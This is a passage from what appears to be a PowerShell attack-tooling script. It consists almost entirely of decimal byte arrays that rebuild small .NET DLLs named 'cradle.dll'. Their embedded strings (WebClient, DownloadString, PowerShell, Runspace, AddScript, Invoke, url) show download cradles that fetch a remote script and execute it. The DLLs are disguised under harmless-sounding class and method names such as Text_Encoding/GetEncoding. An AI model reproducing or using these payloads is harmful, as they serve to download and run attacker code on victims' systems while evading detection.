,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`222,47,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(236,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,68,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,208,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,176,3,0,0,8,0,0,0,35,85,83,0,184,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,200,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,128,0,96,0,6,0,160,0,96,0,10,0,9,1,226,0,10,0,25,1,226,0,10,0,54,1,197,0,14,0,96,1,85,1,6,0,121,1,38,0,6,0,176,1,145,1,10,0,189,1,197,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,157,32,0,0,0,0,134,24,68,0,16,0,3,0,0,0,1,0,74,0,0,0,2,0,78,0,17,0,68,0,20,0,25,0,68,0,16,0,33,0,34,1,34,0,41,0,49,1,16,0,49,0,65,1,39,0,49,0,72,1,44,0,57,0,68,0,16,0,57,0,106,1,50,0,65,0,128,1,55,0,49,0,135,1,62,0,49,0,198,1,68,0,9,0,68,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(190,0,0,0,4)+@(0)*11+@(1,0,29,0,0,0,0,0,3)+@(0)*11+@(25,0,197,0,0,0,0,0,4)+@(0)*11+@(1,0,38)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,116,114,105,110,103,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,59,0,0,0,0,0,30,219,86,1,57,72,11,73,144,80,161,115,251,116,168,99,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,20,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Text_Encoding' , 'GetEncoding'       , @("$CompiledHeader`23,50,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(48,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,184,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,220,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,84,2,0,0,8,0,0,0,35,85,83,0,92,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,108,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,108,0,76,0,6,0,140,0,76,0,10,0,192,0,181,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,109,32,0,0,0,0,134,24,70,0,15,0,2,0,0,0,1,0,177,0,17,0,70,0,19,0,25,0,70,0,15,0,33,0,70,0,15,0,33,0,202,0,24,0,9,0,70,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(170,0,0,0,2)+@(0)*11+@(1,0,35,0,0,0,0,0,2)+@(0)*11+@(1,0,44)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,101,120,116,95,69,110,99,111,100,105,110,103,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,69,110,99,111,100,105,110,103,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,0,3,32,0,0,0,0,0,253,147,159,113,198,10,179,69,182,188,122,245,11,148,137,88,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,88,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`38,50,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(168,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,12,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,176,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,128,3,0,0,8,0,0,0,35,85,83,0,136,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,152,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,112,0,80,0,6,0,144,0,80,0,10,0,249,0,210,0,10,0,9,1,210,0,10,0,38,1,181,0,14,0,80,1,69,1,6,0,146,1,115,1,10,0,159,1,181,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,146,32,0,0,0,0,134,24,70,0,15,0,2,0,0,0,1,0,76,0,17,0,70,0,19,0,25,0,70,0,15,0,33,0,18,1,33,0,41,0,33,1,15,0,49,0,49,1,38,0,49,0,56,1,43,0,57,0,70,0,15,0,57,0,90,1,49,0,49,0,105,1,54,0,49,0,168,1,60,0,9,0,70,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(174,0,0,0,4)+@(0)*11+@(1,0,35,0,0,0,0,0,3)+@(0)*11+@(24,0,181,0,0,0,0,0,4)+@(0)*11+@(1,0,44)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,101,120,116,95,69,110,99,111,100,105,110,103,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,69,110,99,111,100,105,110,103,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,32,0,0,0,0,0,198,249,46,228,165,66,170,73,174,163,99,104,23,31,123,169,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,208,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`51,50,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(236,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,68,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,208,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,176,3,0,0,8,0,0,0,35,85,83,0,184,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,200,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,130,0,98,0,6,0,162,0,98,0,10,0,11,1,228,0,10,0,27,1,228,0,10,0,56,1,199,0,14,0,98,1,87,1,6,0,123,1,44,0,6,0,178,1,147,1,10,0,191,1,199,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,157,32,0,0,0,0,134,24,70,0,16,0,3,0,0,0,1,0,76,0,0,0,2,0,80,0,17,0,70,0,20,0,25,0,70,0,16,0,33,0,36,1,34,0,41,0,51,1,16,0,49,0,67,1,39,0,49,0,74,1,44,0,57,0,70,0,16,0,57,0,108,1,50,0,65,0,130,1,55,0,49,0,137,1,62,0,49,0,200,1,68,0,9,0,70,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(192,0,0,0,4)+@(0)*11+@(1,0,35,0,0,0,0,0,3)+@(0)*11+@(25,0,199,0,0,0,0,0,4)+@(0)*11+@(1,0,44)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,84,101,120,116,95,69,110,99,111,100,105,110,103,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,69,110,99,111,100,105,110,103,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0